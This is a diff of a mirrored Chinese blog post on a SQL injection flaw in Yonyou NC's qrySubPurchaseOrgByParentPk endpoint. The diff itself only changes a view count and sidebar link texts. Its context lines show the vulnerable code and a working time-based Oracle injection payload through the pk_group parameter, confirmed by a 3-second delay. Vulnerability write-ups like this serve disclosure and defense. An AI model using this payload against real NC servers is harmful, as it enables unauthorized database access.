@@ -7,17 +7,17 @@ asset_dir: assets/用友nc-qrysubpurchaseorgbyparentpk-sql注入漏洞
 # 用友NC qrySubPurchaseOrgByParentPk SQL注入漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/6/12 08:25
-- 1363浏览
+- 1364浏览
 - [0评论](#comment)
 - 25分钟阅读
 
 深入探索
 
-编程语言教程
+文件大小转换
 
-授权
+编码转换工具
 
-企业安全咨询
+安全认证考试
 
 ---
 
@@ -30,6 +30,14 @@ SQL注入防护
 # 影响版本
 
 NC65
+
+深入探索
+
+Windows安全工具
+
+安全运维咨询
+
+企业安全咨询
 
 # fofa语法
 
@@ -52,14 +60,6 @@ public Object doQuerySubPurchaseOrgByParentPk(HttpServletRequest request, HttpSe
                 return orgPojoList;
             }
 ```
-
-深入探索
-
-传输层安全性协议
-
-文件大小转换
-
-漏洞扫描服务
 
 用户可控参数 `pk_group` 未经任何处理或校验过滤就直接带入 `queryRegisterOrgsFilterByName` 方法
 
@@ -113,7 +113,7 @@ pk_group=1' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE('any',3)--
 
 成功延时 3 秒
 
-漏洞预警服务
+漏洞修复方案
 
 - 标签：
 - [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
